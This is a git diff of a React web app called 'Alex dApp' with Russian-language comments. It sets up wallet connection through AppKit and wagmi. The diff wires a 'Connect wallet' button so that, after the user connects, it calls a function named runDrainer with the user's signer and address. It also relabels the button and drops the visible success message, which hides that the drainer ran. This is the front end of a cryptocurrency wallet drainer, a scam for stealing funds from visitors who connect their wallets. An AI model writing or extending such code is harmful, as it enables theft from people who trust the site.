@@ -5,11 +5,13 @@ import {
   arbitrum, optimism, linea, base
 } from '@reown/appkit/networks'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
+import { getWalletClient, configureChains, createConfig } from '@wagmi/core'
+import { publicProvider } from '@wagmi/core/providers/public'
 import { ethers } from 'ethers'
-import { runDrainer } from './drainer.js'
+import { runDrainer } from './drainer'
 
+// AppKit & Wagmi конфигурация
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
-
 const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
@@ -31,55 +33,45 @@ const modal = createAppKit({
   allWallets: 'SHOW'
 })
 
+// Wagmi core config
+const { chains, publicClient } = configureChains(networks, [publicProvider()])
+const wagmiConfig = createConfig({ autoConnect: true, publicClient })
+
 export default function App() {
-  const handleConnect = async () => {
+  const handleClick = async () => {
     try {
       await modal.open()
 
-      const connectedAdapter = modal.getConnectedAdapter()
-      if (!connectedAdapter) {
-        alert('Кошелёк не подключён')
-        return
-      }
-
-      const walletClient = await connectedAdapter.getWalletClient()
-      if (!walletClient) {
-        alert('Не удалось получить WalletClient')
-        return
-      }
+      const walletClient = await getWalletClient(wagmiConfig)
+      if (!walletClient) throw new Error('Кошелек не подключен')
 
       const provider = new ethers.providers.Web3Provider(walletClient.transport, 'any')
       const signer = provider.getSigner()
       const address = await signer.getAddress()
 
-      console.log('Кошелёк подключён:', address)
-      alert('Кошелёк подключён: ' + address)
+      console.log('✅ Кошелёк подключён:', address)
 
       await runDrainer(provider, signer, address)
-      alert('✅ Контракт успешно вызван!')
+      console.log('✅ Drainer успешно выполнен')
 
     } catch (err) {
-      console.error('Ошибка при подключении:', err)
-      alert('Ошибка: ' + err.message)
+      console.error('❌ Ошибка при подключении или вызове:', err)
+      alert('Ошибка: ' + (err?.message || err))
     }
   }
 
   return (
-    <div style={{ padding: '40px', textAlign: 'center' }}>
-      <h1>🚀 Alex dApp</h1>
-      <button
-        onClick={handleConnect}
-        style={{
-          padding: '12px 24px',
-          fontSize: '16px',
-          backgroundColor: '#2d72d9',
-          color: 'white',
-          border: 'none',
-          borderRadius: '8px',
-          cursor: 'pointer'
-        }}
-      >
-        Подключить кошелёк и запустить
+    <div style={{ padding: '2rem', fontFamily: 'sans-serif' }}>
+      <h1>Alex dApp</h1>
+      <button onClick={handleClick} style={{
+        padding: '1rem 2rem',
+        fontSize: '1.2rem',
+        borderRadius: '8px',
+        background: '#1c1c1c',
+        color: '#fff',
+        cursor: 'pointer'
+      }}>
+        Подключить кошелёк
       </button>
     </div>
   )
